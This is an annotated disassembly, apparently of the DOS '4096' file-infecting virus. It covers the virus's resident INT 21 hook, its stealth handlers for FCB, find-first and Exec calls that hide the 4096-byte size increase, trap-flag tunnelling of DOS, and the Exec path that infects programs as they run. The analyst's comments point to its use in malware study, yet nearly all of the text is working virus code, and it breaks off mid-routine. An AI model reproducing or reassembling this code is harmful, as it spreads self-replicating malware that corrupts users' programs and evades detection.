01D1 B9 00 0B                MOV CX,0B00
01D4 BE FE 15                MOV SI,015FE
01D7 8B FE                   MOV DI,SI
01D9 FD                      STD
01DA F3 A5                   REP MOVSW
01DC FC                      CLD
01DD 06                      PUSH ES
01DE B8 EE 01                MOV AX,01EE
01E1 50                      PUSH AX
01E2 2E 8E 06 45 12          CS MOV ES,W[01245]
01E7 B4 4A                   MOV AH,04A
01E9 8B DD                   MOV BX,BP
01EB CD 21                   INT 021
01ED CB                      RETF
01EE E8 C9 0B                CALL 0DBA                  ; Swap INT 21 Pointer
01F1 2E 8C 0E 4E 12          CS MOV W[0124E],CS
01F6 E8 C1 0B                CALL 0DBA                  ; Swap INT 21 Pointer
01F9 0E                      PUSH CS
01FA 1F                      POP DS
01FB C6 06 A2 12 14          MOV B[012A2],014
0200 0E                      PUSH CS
0201 07                      POP ES
0202 BF 52 12                MOV DI,01252
0205 B9 14 00                MOV CX,014
0208 33 C0                   XOR AX,AX
020A F3 AB                   REP STOSW
020C A2 EF 12                MOV B[012EF],AL
020F A1 45 12                MOV AX,W[01245]
0212 8E C0                   MOV ES,AX
0214 26 C5 16 0A 00          ES LDS DX,[0A]
0219 8E D8                   MOV DS,AX
021B 05 10 00                ADD AX,010
021E 2E 01 06 1A 00          CS ADD W[01A],AX
0223 2E 80 3E 20 00 00       CS CMP B[020],0
0229 75 24                   JNE 024F
022B FB                      STI
022C 2E A1 04 00             CS MOV AX,W[4]
0230 A3 00 01                MOV W[0100],AX
0233 2E A1 06 00             CS MOV AX,W[6]
0237 A3 02 01                MOV W[0102],AX
023A 2E A1 08 00             CS MOV AX,W[8]
023E A3 04 01                MOV W[0104],AX
0241 2E FF 36 45 12          CS PUSH W[01245]
0246 B8 00 01                MOV AX,0100
0249 50                      PUSH AX
024A 2E A1 E3 12             CS MOV AX,W[012E3]
024E CB                      RETF
024F 2E 01 06 12 00          CS ADD W[012],AX
0254 2E A1 E3 12             CS MOV AX,W[012E3]
0258 2E 8E 16 12 00          CS MOV SS,W[012]
025D 2E 8B 26 14 00          CS MOV SP,W[014]
0262 FB                      STI
0263 2E FF 2E 18 00          CS JMP D[018]

                        ; External Entry Point for COM Files


0268 81 FC 00 01             CMP SP,0100
026C 77 02                   JA 0270
026E 33 E4                   XOR SP,SP
0270 8B E8                   MOV BP,AX
0272 E8 00 00                CALL 0275
0275 59                      POP CX
0276 81 E9 75 02             SUB CX,0275
027A 8C C8                   MOV AX,CS
027C BB 10 00                MOV BX,010
027F F7 E3                   MUL BX
0281 03 C1                   ADD AX,CX
0283 83 D2 00                ADC DX,0
0286 F7 F3                   DIV BX
0288 50                      PUSH AX
0289 B8 AB 00                MOV AX,0AB
028C 50                      PUSH AX
028D 8B C5                   MOV AX,BP
028F CB                      RETF



0290 30 7C 07                db 30,077C Get DOS Version
0293 23 4E 04                db 23,044E Get File Size Using FCB
0296 37 8B 0E                db 37,0E8B Get/Set Switch Character
0299 4B 8B 05                db 4B,058B Exec
029C 3C D5 04                db 3C,04D5 Create File Using Handle
029F 3D 11 05                db 3D,0511 Open File Using Handle
02A2 3E 55 05                db 3E,0555 Close File Using Handle
02A5 0F 9B 03                db 0F,039B Open File Using FCB
02A8 14 CD 03                db 14,03CD Sequential Read Using FCB
02AB 21 C1 03                db 21,03C1 Random Read Using FCB
02AC 27 BF 03                db 27,03BF Random Block Read Using FCB
02B1 11 59 03                db 11,0359 Search for First Entry Using FCB
02B4 12 59 03                db 12,0359 Search for Next Entry Using FCB
02B6 4E 9F 04                db 4E,049F Find First Matching File
02B9 4F 9F 04                db 4F,049F Find Next Matching File
02BC 3F A5 0A                db 3F,0AA5 Read from File or Device Using Handle
02BF 40 8A 0B                db 40,0B8A Write to File or Device Using Handle
02C2 42 90 0A                db 42,0A90 Move File Pointer Using Handle
02C5 57 41 0A                db 57,0A41 Get Set File Date & Time Using Handle
02C8 48 34 0E                db 48,0E34 Allocate Memory

                        ; External INT 21 Entry Point

02CC 3D 00 4B                CMP AX,04B00               ;
02CF 75 04                   JNE 02D5                   ; Not Exec ?  02D5
02D1 2E A2 E2 12             MOV CS:B[012E2],AL         ; [12E2]=0/1 (Before 00)
02D5 55                      PUSH BP                    ; Entry BP
02D6 8B EC                   MOV BP,SP                  ; BP=SP
02D8 FF 76 06                PUSH W[BP+6]               ; Push Entry Flags
02DB 2E 8F 06 B3 12          POP CS:W[012B3]            ; [12B3]=Entry Flags
02E0 5D                      POP BP                     ; Restore BP
02E1 55                      PUSH BP                    ; Save BP
02E2 8B EC                   MOV BP,SP                  ; BP=SP
02E4 E8 08 0B                CALL 0DEF                  ; Set Stack & pusha
02E7 E8 D0 0A                CALL 0DBA                  ; Set INT 21 Pointer
02EA E8 9A 0A                CALL 0D87                  ; Clear Ctrl-Break Chk
02ED E8 F6 0A                CALL 0DE6                  ; Set Stack & PopA
02F0 E8 B4 0A                CALL 0DA7                  ; pusha
02F3 53                      PUSH BX                    ; BX=Entry BX
02F4 BB 90 02                MOV BX,0290                ; BX=0290
02F7 2E 3A 27                CMP AH,CS:B[BX]            ; AH<==>CS:[BX]
02FA 75 09                   JNE 0305                   ; AH!=[BX] ?  0305
02FC 2E 8B 5F 01             MOV BX,CS:W[BX+1]          ; BX=Address of Subfunct
                                                        ;    in AH.
0300 87 5E EC                XCHG W[BP-014],BX          ; Change Return Address
0303 FC                      CLD                        ;
0304 C3                      RET                        ; Jump to Subfunction
0305 83 C3 03                ADD BX,3                   ; BX+=03
0308 81 FB CC 02             CMP BX,02CC                ; BX==02CC ?
030C 72 E9                   JB 02F7                    ; ?  02F7 Go Searching
030E 5B                      POP BX                     ; BX = Entry BX
030F E8 89 0A                CALL 0D9B                  ; Restore Ctrl-Break Chk
0312 E4 21                   IN AL,021                  ;
0314 2E A2 E5 12             CS MOV B[012E5],AL         ; Save IRQs Mask
0318 B0 FF                   MOV AL,0FF                 ; No IRQs
031A E6 21                   OUT 021,AL                 ;
031C 2E C6 06 51 12 04       CS MOV B[01251],4          ; [1251]=4
0322 2E C6 06 50 12 01       MOV CS:B[01250],1          ; [1250]=1
0328 E8 F1 0A                CALL 0E1C                  ; Set INT 01 to CS:0023
032B E8 A5 0A                CALL 0DD3                  ; popa
032E 50                      PUSH AX                    ;;
032F 2E A1 B3 12             MOV AX,CS:W[012B3]         ;;
0333 0D 00 01                OR AX,0100                 ;; Set Trap Falg
0336 50                      PUSH AX                    ;;
0337 9D                      POPF                       ;;
0338 58                      POP AX                     ;;
0339 5D                      POP BP                     ;;
033A 2E FF 2E 35 12          CS JMP D[01235]            ; JMP INT 21
                                                        ; With 01 Restore INT 21
                                                        ; to point 4096 after 21
033F E8 AD 0A                CALL 0DEF
0342 E8 56 0A                CALL 0D9B                  ; Restore Ctrl-Break Chk
0345 E8 72 0A                CALL 0DBA                  ; Swap INT 21 Pointer
0348 E8 9B 0A                CALL 0DE6                  ; Set 4096 Stack & PopA
034B 5D                      POP BP
034C 55                      PUSH BP
034D 8B EC                   MOV BP,SP
034F 2E FF 36 B3 12          CS PUSH W[012B3]
0354 8F 46 06                POP W[BP+6]
0357 5D                      POP BP
0358 CF                      IRET

                        ; External INT 21/11 Entry Point
                        ; Search for First Entry Using FCB
                        ; Input:
                        ;   DS:DX -> FCB        Unopened FCB
                        ; Return:
                        ;       AL = 00         Matching File Found
                        ;       AL = FF         File Not Found
                        ;      DTA = File Data  Matching File Unopened FCB


                        ; External INT 21/12 Entry Point
                        ; Search for Next Entry Using FCB
                        ; Input:
                        ;   DS:DX -> FCB        Unopened FCB From 21/11 21/12
                        ; Return:
                        ;       AL = 00         Matching File Found
                        ;       AL = FF         File Not Found
                        ;      DTA = File Data  Matching File Unopened FCB

                    ; They are trapped for restoring the original
                    ; values of date and length to those of the original
                    ; file.

0359 E8 77 0A                CALL 0DD3                  ; PopA Restore Registers 
                                                        ; At Entry
035C E8 35 0B                CALL 0E94                  ; INT 21(Original FF/FN)
035F 0A C0                   OR AL,AL                   ; If Found Go On
0361 75 DC                   JNE 033F                   ; If Not Found Return
0363 E8 41 0A                CALL 0DA7                  ; PushA
0366 E8 18 02                CALL 0581                  ; DS:BX -> DTA
0369 B0 00                   MOV AL,0                   ; AL=00
036B 80 3F FF                CMP B[BX],0FF              ; Is this an XFCB?
036E 75 06                   JNE 0376                   ; Only FCB ?  0376
0370 8A 47 06                MOV AL,B[BX+6]             ; AL=File Attributes
0373 83 C3 07                ADD BX,7                   ; BX+=7
0376 2E 20 06 F0 12          AND CS:B[012F0],AL         ; [12F0]&=File Attr
037B F6 47 1A 80             TEST B[BX+01A],080         ;
                                ; I Think here is a bug, the 1Ah should be 15h
                                ; This is for Date, and it's known that the
                                ; 4096 set's the highest bit for detecting
                                ; him self in other files. The Offset 1Ah
                                ; contains data for the cluster occuped by the
                                ; file.
037F 74 15                   JZ 0396                    ; Not Infected ? Return
0381 80 6F 1A C8             SUB B[BX+01A],0C8          ;
                                ; Here the 1Ah should be 15h again.
0385 2E 80 3E F0 12 00       CMP B[012F0],0             ;
038B 75 09                   JNE 0396                   ;
038D 81 6F 1D 00 10          SUB W[BX+01D],01000        ; File Size-=4096
                                ; Another Bug? the 1Dh must be 10h for
                                ; decresing the file size. According with
                                ; my information.
0392 83 5F 1F 00             SBB W[BX+01F],0            ;
                                ; Another Bug, the 1F gotta be 12
0396 E8 3A 0A                CALL 0DD3                  ; PopA
0399 EB A4                   JMP 033F                   ; Return

                        ; External INT 21/0F Entry Point
                        ; Open File Using FCB
                        ; Input:
                        ;   DS:DX -> FCB        Unopened FCB
                        ; Return:
                        ;       AL = 00         If File Opened
                        ;       AL = FF         If Unable To Open

039B E8 35 0A                CALL 0DD3                  ; PopA
039E E8 F3 0A                CALL 0E94                  ; INT 21
03A1 E8 03 0A                CALL 0DA7                  ; PushA
03A4 0A C0                   OR AL,AL                   ;
03A6 75 EE                   JNE 0396                   ; Could'n Open?  Return
03A8 8B DA                   MOV BX,DX                  ; DS:BX -> Opend FCB
03AA F6 47 15 80             TEST B[BX+015],080         ; Record Size>32K ?
03AE 74 E6                   JZ 0396                    ; If Not ?  Return
03B0 80 6F 15 C8             SUB B[BX+015],0C8          ;???
03B4 81 6F 10 00 10          SUB W[BX+010],01000        ;;File Size-=4096
03B9 80 5F 12 00             SBB B[BX+012],0            ;;
03BD EB D7                   JMP 0396                   ; Return

                        ; External INT 21/27 Entry Point
                        ; Random Block Read Using FCB
                        ; Input:
                        ;   CX = Count      Number od Records to Read
                        ;   DS:DX -> FCB        Opened FCB
                        ; Return:
                        ;       AL = 00         On Successful Read
                        ;       AL = 01         On EOF, no data read
                        ;       AL = 02         If DTA is too small
                        ;       AL = 03         On EOF or Partial Record Read
                        ;       CX = Count      Actual Number of Record Read

03BF E3 1B                   JCXZ 03DC                  ; If Nothing to Read
                                                        ; Return

                        ; External INT 21/21 Entry Point
                        ; Random Read Using FCB
                        ; Input:
                        ;   DS:DX -> FCB        Opened FCB
                        ; Return:
                        ;       AL = 00         On Successful Read
                        ;       AL = 01         On EOF, no data read
                        ;       AL = 02         If DTA is too small
                        ;       AL = 03         On EOF or Partial Record Read

03C1 8B DA                   MOV BX,DX                  ; DS:BX->FCB
03C3 8B 77 21                MOV SI,W[BX+021]           ; SI=Random Access 
                                                        ; Record Number
03C6 0B 77 23                OR SI,W[BX+023]            ;
03C9 75 11                   JNE 03DC                   ; Record Size!=00 ? 
03CB EB 0A                   JMP 03D7                   ; Return

                        ; External INT 21/14 Entry Point
                        ; Sequencial Read Using FCB
                        ; Input:
                        ;   DS:DX -> FCB        Opened FCB
                        ; Return:
                        ;       AL = 00         On Successful Read
                        ;       AL = 01         On EOF, no data read
                        ;       AL = 02         If DTA is too small
                        ;       AL = 03         On EOF or Partial Record Read

03CD 8B DA                   MOV BX,DX                  ; DS:BX->FCB
03CF 8B 47 0C                MOV AX,W[BX+0C]            ; AX=Current Block #
03D2 0A 47 20                OR AL,B[BX+020]            ; AX!=Record inside Blk
03D5 75 05                   JNE 03DC                   ; Not Start Of File? 
03D7 E8 3F 05                CALL 0919                  ; Is .EXE or .COM?
03DA 73 03                   JNC 03DF                   ; .EXE or .COM? 
03DC E9 30 FF                JMP 030F                   ; If Neither, Return
03DF E8 F1 09                CALL 0DD3                  ; popa
03E2 E8 C2 09                CALL 0DA7                  ; PushA
03E5 E8 AC 0A                CALL 0E94                  ; INT 21
03E8 89 46 FC                MOV W[BP-4],AX             ; Save AX
03EB 89 4E F8                MOV W[BP-8],CX             ; Save CX
03EE 1E                      PUSH DS                    ; DS:DX -> FCB
03EF 52                      PUSH DX                    ;
03F0 E8 8E 01                CALL 0581                  ; DS:BX -> DTA
03F3 83 7F 14 01             CMP W[BX+014],1            ; Current Block #
03F7 74 0F                   JE 0408                    ; Blk # = 1 ? 
03F9 8B 07                   MOV AX,W[BX]               ; AX =
03FB 03 47 02                ADD AX,W[BX+2]             ;
03FE 03 47 04                ADD AX,W[BX+4]             ;
0401 74 05                   JE 0408                    ; Are you lucky ? 
0403 83 C4 04                ADD SP,4                   ; Un push DS & DX (nopop)
0406 EB 8E                   JMP 0396                   ; Return
0408 5A                      POP DX                     ;
0409 1F                      POP DS                     ; DS:DX -> FCB
040A 8B F2                   MOV SI,DX                  ; DS:SI -> FCB
040C 0E                      PUSH CS                    ;
040D 07                      POP ES                     ; ES=CS
040E BF B5 12                MOV DI,012B5               ; DI=12B5
0411 B9 25 00                MOV CX,025                 ; CX=0025
0414 F3 A4                   REP MOVSB                  ; Copy FCB to CS:12B5
0416 BF B5 12                MOV DI,012B5               ; DI=12B5
0419 0E                      PUSH CS                    ;
041A 1F                      POP DS                     ; DS:DI -> Copy of FCB
041B 8B 45 10                MOV AX,W[DI+010]           ; AX='EX' || AX='CO'
041E 8B 55 12                MOV DX,W[DI+012]           ; DX='E?' || DX='M?'
0421 05 0F 10                ADD AX,0100F
0424 83 D2 00                ADC DX,0
0427 25 F0 FF                AND AX,-010
042A 89 45 10                MOV W[DI+010],AX
042D 89 55 12                MOV W[DI+012],DX
0430 2D FC 0F                SUB AX,0FFC
0433 83 DA 00                SBB DX,0
0436 89 45 21                MOV W[DI+021],AX
0439 89 55 23                MOV W[DI+023],DX
043C C7 45 0E 01 00          MOV W[DI+0E],1
0441 B9 1C 00                MOV CX,01C
0444 8B D7                   MOV DX,DI
0446 B4 27                   MOV AH,027
0448 E8 49 0A                CALL 0E94                  ; INT 21
044B E9 48 FF                JMP 0396

                        ; External INT 21/23 Entry Point
                        ; Get File Size Using FCB
                        ; Input:
                        ;       DS:DX = Pointer to an Unopened FCB
                        ; Return:
                        ;       AL = 00         If successful
                        ;       AL = FF         If file not found
                        ;       Random Record Position in FCB is changed
                        ;       to File Record Count

044E 0E                      PUSH CS
044F 07                      POP ES
0450 8B F2                   MOV SI,DX
0452 BF B5 12                MOV DI,012B5
0455 B9 25 00                MOV CX,025
0458 F3 A4                   REP MOVSB
045A 1E                      PUSH DS
045B 52                      PUSH DX
045C 0E                      PUSH CS
045D 1F                      POP DS
045E BA B5 12                MOV DX,012B5
0461 B4 0F                   MOV AH,0F
0463 E8 2E 0A                CALL 0E94                  ; INT 21
0466 B4 10                   MOV AH,010
0468 E8 29 0A                CALL 0E94                  ; INT 21
046B F6 06 CA 12 80          TEST B[012CA],080
0470 5E                      POP SI
0471 1F                      POP DS
0472 74 7E                   JE 04F2
0474 2E C4 1E C5 12          CS LES BX,[012C5]
0479 8C C0                   MOV AX,ES
047B 81 EB 00 10             SUB BX,01000
047F 1D 00 00                SBB AX,0
0482 33 D2                   XOR DX,DX
0484 2E 8B 0E C3 12          CS MOV CX,W[012C3]
0489 49                      DEC CX
048A 03 D9                   ADD BX,CX
048C 15 00 00                ADC AX,0
048F 41                      INC CX
0490 F7 F1                   DIV CX
0492 89 44 23                MOV W[SI+023],AX
0495 92                      XCHG AX,DX
0496 93                      XCHG AX,BX
0497 F7 F1                   DIV CX
0499 89 44 21                MOV W[SI+021],AX
049C E9 F7 FE                JMP 0396

                        ; External INT 21/4E Entry Point
                        ; Find First Matching File
                        ; Input:
                        ;       CX = Attr       Attribute Using During Search
                        ;   DS:DX -> ASCIIZ     Filespec Including Wildcard
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Error Code If CF = 1
                        ;      DTA = File Data  Matching File Information


                        ; External INT 21/4F Entry Point
                        ; Find Next Matching File
                        ; Input:
                        ;       CX = Attr       Attribute Using During Search
                        ;   DS:DX -> ASCIIZ     Filespec Including Wildcard
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Error Code If CF = 1
                        ;      DTA = File Data  Matching File Information

049F 2E 83 26 B3 12 FE       CS AND W[012B3],-2
04A5 E8 2B 09                CALL 0DD3                  ; popa
04A8 E8 E9 09                CALL 0E94                  ; INT 21
04AB E8 F9 08                CALL 0DA7                  ; PushA
04AE 73 09                   JAE 04B9                   ;
04B0 2E 83 0E B3 12 01       CS OR W[012B3],1
04B6 E9 DD FE                JMP 0396
04B9 E8 C5 00                CALL 0581                  ; DS:BX -> DTA
04BC F6 47 19 80             TEST B[BX+019],080
04C0 75 03                   JNE 04C5
04C2 E9 D1 FE                JMP 0396
04C5 81 6F 1A 00 10          SUB W[BX+01A],01000
04CA 83 5F 1C 00             SBB W[BX+01C],0
04CE 80 6F 19 C8             SUB B[BX+019],0C8
04D2 E9 C1 FE                JMP 0396

                        ; External INT 21/3C Entry Point
                        ; Create File Using Handle
                        ; Input:
                        ;       CX = File Attribute
                        ;   DS:DX -> ASCIIZ     Path Name
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Hanlde     If CF = 0
                        ;       AX = Error Code If CF = 1

04D5 51                      PUSH CX
04D6 83 E1 07                AND CX,7
04D9 83 F9 07                CMP CX,7
04DC 74 2F                   JE 050D
04DE 59                      POP CX
04DF E8 E4 07                CALL 0CC6                  ; Make [122D] -> INT 13
04E2 E8 AF 09                CALL 0E94                  ; INT 21
04E5 E8 84 08                CALL 0D6C                  ; Restore INTs 13h & 24h
04E8 9C                      PUSHF
04E9 2E 80 3E DA 12 00       CS CMP B[012DA],0
04EF 74 04                   JE 04F5
04F1 9D                      POPF
04F2 E9 1A FE                JMP 030F                   ; Exec old 21h and Ret
04F5 9D                      POPF
04F6 72 09                   JB 0501
04F8 8B D8                   MOV BX,AX
04FA B4 3E                   MOV AH,03E
04FC E8 95 09                CALL 0E94                  ; INT 21
04FF EB 10                   JMP 0511
0501 2E 80 0E B3 12 01       CS OR B[012B3],1
0507 89 46 FC                MOV W[BP-4],AX
050A E9 89 FE                JMP 0396
050D 59                      POP CX
050E E9 FE FD                JMP 030F                   ; Exec old 21h and Ret

                        ; External INT 21/3D Entry Point
                        ; Open File Using Handle
                        ; Input:
                        ;       BX = Handle
                        ;       AL =            Open Access Mode
                        ;            00         Read Only
                        ;            01         Write Only
                        ;            02         Read/Write
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Handle     If CF = 0
                        ;       AX = Error Code If CF =1

0511 E8 5D 04                CALL 0971                  ; [12A3] = PSP Segment
0514 E8 0E 04                CALL 0925                  ; DS:DX -> EXE?
0517 72 39                   JB 0552
0519 2E 80 3E A2 12 00       CS CMP B[012A2],0
051F 74 31                   JE 0552
0521 E8 5A 04                CALL 097E                  ; Open File For R/W
0524 83 FB FF                CMP BX,-1                  ; Error Opening?
0527 74 29                   JE 0552
0529 2E FE 0E A2 12          CS DEC B[012A2]
052E 0E                      PUSH CS
052F 07                      POP ES
0530 BF 52 12                MOV DI,01252
0533 B9 14 00                MOV CX,014
0536 33 C0                   XOR AX,AX
0538 F2 AF                   REPNE SCASW
053A 2E A1 A3 12             CS MOV AX,W[012A3]
053E 26 89 45 FE             ES MOV W[DI-2],AX
0542 26 89 5D 26             ES MOV W[DI+026],BX
0546 89 5E FC                MOV W[BP-4],BX
0549 2E 80 26 B3 12 FE       CS AND B[012B3],0FE
054F E9 44 FE                JMP 0396
0552 E9 BA FD                JMP 030F                   ; Exec old 21h and Ret

                        ; External INT 21/3E Entry Point
                        ; Close File Using Handle
                        ; Input:
                        ;       BX = Handle     File Handle To Close
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Error Code If CF = 1

0555 0E                      PUSH CS
0556 07                      POP ES
0557 E8 17 04                CALL 0971                  ; [12A3] = PSP Segment
055A BF 52 12                MOV DI,01252
055D B9 14 00                MOV CX,014
0560 2E A1 A3 12             CS MOV AX,W[012A3]
0564 F2 AF                   REPNE SCASW
0566 75 16                   JNE 057E
0568 26 3B 5D 26             ES CMP BX,W[DI+026]
056C 75 F6                   JNE 0564
056E 26 C7 45 FE 00 00       ES MOV W[DI-2],0
0574 E8 1C 02                CALL 0793
0577 2E FE 06 A2 12          CS INC B[012A2]
057C EB CB                   JMP 0549
057E E9 8E FD                JMP 030F                   ; Exec old 21h and Ret

                        ; Subrutine. Do DS:BX Point to current DTA

0581 06                      PUSH ES                    ;
0582 B4 2F                   MOV AH,02F                 ; AH=2F
0584 E8 0D 09                CALL 0E94                  ; INT 21
0587 06                      PUSH ES                    ; Do ES:BX -> DTA
0588 1F                      POP DS                     ; DS=ES
0589 07                      POP ES                     ; ES=ES
058A C3                      RET                        ; DS:BX -> DTA




                        ; External INT 21/4B Entry Point
                        ; Exec
                        ; Input:
                        ;       AL = 00         Exec
                        ;       AL = 01         Load, do PSP and Return
                        ;       AL = 03         Load fragment
                        ;   DS:DX -> ASCIIZ     File Name
                        ;   ES:BX -> Parameter Block
                        ;       00  Env Seg
                        ;       02  Ptr to Cmd Ln
                        ;       06  Ptr to 1;FCB
                        ;       0A  Ptr to 2;FCB
                        ;       0E  SS:SP
                        ;       12  CS:IP
                        ; Return:
                        ;       AX = Error Code         If CF Set
                        ;   ES:BX -> Parameter Block

058B 0A C0                   OR AL,AL                   ; AL == Exec SubFuncion
058D 74 03                   JE 0592                    ; AL == 00 ?  0592
058F E9 4E 01                JMP 06E0                   ; AL != 00 ?  06E0
0592 1E                      PUSH DS                    ; DS = Entry DS
0593 52                      PUSH DX                    ; DX = Entry DX
0594 2E 89 1E 24 12          MOV CS:W[01224],BX         ; 1224 = Entry BX
0599 2E 8C 06 26 12          MOV CS:W[01226],ES         ; 1226 = Entry ES
059E 2E C5 36 24 12          LDS SI,CS:[01224]          ; DS:SI -> Parameter Blk
                                                        ; DS=ES     SI=BX
05A3 BF F1 12                MOV DI,012F1               ; DI = 12F1
05A6 B9 0E 00                MOV CX,0E                  ; CX = 000E
05A9 0E                      PUSH CS                    ;
05AA 07                      POP ES                     ; ES = CS
05AB F3 A4                   REP MOVSB                  ; Copy ParamBlk to 12F1
05AD 5E                      POP SI                     ; SI = Entry DX
05AE 1F                      POP DS                     ; DS = Entry DS
                                                        ; DS:DX -> ASCIIZ FName
05AF BF 07 13                MOV DI,01307               ; DI = 1307
05B2 B9 50 00                MOV CX,050                 ; CX = 0050
05B5 F3 A4                   REP MOVSB                  ; Copy File Name
05B7 BB FF FF                MOV BX,-1                  ; BX = FFFF
05BA E8 7D 08                CALL 0E3A                  ; BX = Free Memory Size
                                                        ; BX = Memory Size
05BD E8 13 08                CALL 0DD3                  ; popa
05C0 5D                      POP BP                     ; BP = Entry BP
05C1 2E 8F 06 E6 12          POP CS:W[012E6]            ; 12E6 = IP
05C6 2E 8F 06 E8 12          POP CS:W[012E8]            ; 12E8 = CS
05CB 2E 8F 06 B3 12          POP CS:W[012B3]            ; 12B3 = Flags on Entry
05D0 B8 01 4B                MOV AX,04B01               ; AX = 4B01
05D3 0E                      PUSH CS                    ;
05D4 07                      POP ES                     ; ES = CS
05D5 BB F1 12                MOV BX,012F1               ; BX = 12F1 (Param Blk)
05D8 9C                      PUSHF                      ;
05D9 2E FF 1E 35 12          CALL CS:D[01235]           ; INT 21h; Load program
05DE 73 20                   JNC 0600                   ; No Error ?  0600
05E0 2E 83 0E B3 12 01       OR W[012B3],1              ; Set Carry Flag
05E6 2E FF 36 B3 12          CS PUSH W[012B3]           ; Push Flags
05EB 2E FF 36 E8 12          CS PUSH W[012E8]           ; Push CS
05F0 2E FF 36 E6 12          CS PUSH W[012E6]           ; Push IP
05F5 55                      PUSH BP                    ; BP = Entry BP
05F6 8B EC                   MOV BP,SP                  ; BP = SP
05F8 2E C4 1E 24 12          LES BX,CS:[01224]          ; ES:BX -> Param. Block
05FD E9 3F FD                JMP 033F                   ; Return

0600 E8 6E 03                CALL 0971                  ; [12A3] = PSP Segment
0603 0E                      PUSH CS                    ;
0604 07                      POP ES                     ; ES = CS
0605 BF 52 12                MOV DI,01252               ; DI = 1252
0608 B9 14 00                MOV CX,014                 ; CX = 0014
060B 2E A1 A3 12             MOV AX,CS:W[012A3]         ; AX = Curr PSP Segment
060F F2 AF                   REPNE SCASW                ; Search the PSP Segment
0611 75 0D                   JNZ 0620                   ; Found it ?  0620
0613 26 C7 45 FE 00 00       MOV ES:W[DI-2],0           ; [1264] = 0000
0619 2E FE 06 A2 12          INC CS:B[012A2]            ; [12A2]++
061E EB EB                   JMP 060B                   ;  060B
0620 2E C5 36 03 13          LDS SI,CS:[01303]          ; DS:SI = CS:IP
0625 83 FE 01                CMP SI,1                   ; If IP==0001 is infctd
0628 75 33                   JNE 065D                   ; IP != 0001 ?  065D
062A 8B 16 1A 00             MOV DX,W[01A]              ; DX = CS on Entry
062E 83 C2 10                ADD DX,010                 ; DX += 0010
0631 B4 51                   MOV AH,051                 ;
0633 E8 5E 08                CALL 0E94                  ; Get Current PSP
0636 03 D3                   ADD DX,BX                  ; DX += Current PSP
0638 2E 89 16 05 13          MOV CS:W[01305],DX         ; CS in Parm Blk=CS
063D FF 36 18 00             PUSH W[018]                ;
0641 2E 8F 06 03 13          POP CS:W[01303]            ; IP in Parm Blk=IP
0646 83 C3 10                ADD BX,010                 ; BX = PSP+10
0649 03 1E 12 00             ADD BX,W[012]              ; BX = SS
064D 2E 89 1E 01 13          MOV CS:W[01301],BX         ; SS in Parm Blk=SS
0652 FF 36 14 00             PUSH W[014]                ;
0656 2E 8F 06 FF 12          POP CS:W[012FF]            ; SP in Parm Blk=SP
065B EB 22                   JMP 067F                   ;  067F
                                                        ; Here if not infected
065D 8B 04                   MOV AX,W[SI]               ; AX = First Word
065F 03 44 02                ADD AX,W[SI+2]             ; AX += Second Word
0662 03 44 04                ADD AX,W[SI+4]             ; AX += Third Word
0665 74 60                   JE 06C7                    ; AX == 0000 ?  06C7
0667 0E                      PUSH CS                    ;
0668 1F                      POP DS                     ; DS = CS
0669 BA 07 13                MOV DX,01307               ; DX = 1307
066C E8 B6 02                CALL 0925                  ; DS:DX -> EXE?
066F E8 0C 03                CALL 097E                  ; Open File For R/W
0672 2E FE 06 EF 12          INC CS:B[012EF]            ; [12EF]++
0677 E8 19 01                CALL 0793                  ; (*)
067A 2E FE 0E EF 12          DEC CS:B[012EF]            ; [12EF]--
067F B4 51                   MOV AH,051                 ; AH=51
0681 E8 10 08                CALL 0E94                  ; INT 21 BX =Current PSP
0684 E8 68 07                CALL 0DEF                  ; Set 4096 Stack & PushA
0687 E8 11 07                CALL 0D9B                  ; Restore Ctrl-Break St
068A E8 2D 07                CALL 0DBA                  ; Swap INT 21 Pointer
068D E8 56 07                CALL 0DE6                  ; Set 4096 Stack & PopA
0690 8E DB                   MOV DS,BX                  ; DS=PSP Segment
0692 8E C3                   MOV ES,BX                  ; ES=PSP Segment
0694 2E FF 36 B3 12          PUSH CS:W[012B3]           ; Push Flags
0699 2E FF 36 E8 12          PUSH CS:W[012E8]           ; Push CS
069E 2E FF 36 E6 12          PUSH CS:W[012E6]           ; Push IP
06A3 8F 06 0A 00             POP W[0A]                  ; Terminate Address
06A7 8F 06 0C 00             POP W[0C]                  ; in PSP = Return Address
06AB 1E                      PUSH DS                    ; DS = PSP
06AC C5 16 0A 00             LDS DX,[0A]                ; DS:DX = Return Address
06B0 B0 22                   MOV AL,022                 ; AL = 22
06B2 E8 E7 08                CALL 0F9C                  ; Do INT 22-> DS:DX
06B5 1F                      POP DS                     ; DS = PSP Segment
06B6 9D                      POPF                       ;
06B7 58                      POP AX                     ; AX =AX at INT 21 Entry
06B8 2E 8E 16 01 13          MOV SS,CS:W[01301]         ; SS = EXE's SS
06BD 2E 8B 26 FF 12          MOV SP,CS:W[012FF]         ; SP = EXE's SP
06C2 2E FF 2E 03 13          JMP CS:D[01303]            ; Jmp to EXE's Entry Point

06C7 8B 5C 01                MOV BX,W[SI+1]
06CA 8B 80 9F FD             MOV AX,W[BX+SI+0FD9F]
06CE 89 04                   MOV W[SI],AX
06D0 8B 80 A1 FD             MOV AX,W[BX+SI+0FDA1]
06D4 89 44 02                MOV W[SI+2],AX
06D7 8B 80 A3 FD             MOV AX,W[BX+SI+0FDA3]
06DB 89 44 04                MOV W[SI+4],AX
06DE EB 9F                   JMP 067F
                                                        ; Here directly if not
                                                        ; Exec subfuncion.
                                                        ; may be AL=0 Load & PSP
                                                        ;        AL=3 Load Image
06E0 3C 01                   CMP AL,1                   ;
06E2 74 03                   JE 06E7                    ; Load & PSP ?  06E7
06E4 E9 28 FC                JMP 030F                   ; Exec old 21h and Ret
                                                        ; Here If Load & PSP
06E7 2E 83 0E B3 12 01       OR CS:W[012B3],1           ; [12B3]|=1 Set Carry
06ED 2E 89 1E 24 12          MOV CS:W[01224],BX         ; [1224] = Param Blk Off
06F2 2E 8C 06 26 12          MOV CS:W[01226],ES         ; [1226] = Param Blk Seg
06F7 E8 D9 06                CALL 0DD3                  ; popa   Entry Registers
06FA E8 97 07                CALL 0E94                  ; INT 21 Do Load & PSP
06FD E8 A7 06                CALL 0DA7                  ; pusha
0700 2E C4 1E 24 12          LES BX,CS:[01224]          ; ES:BX = Param Blk Addr
0705 26 C5 77 12             LDS SI,ES:[BX+012]         ; DS:SI = CS:IP
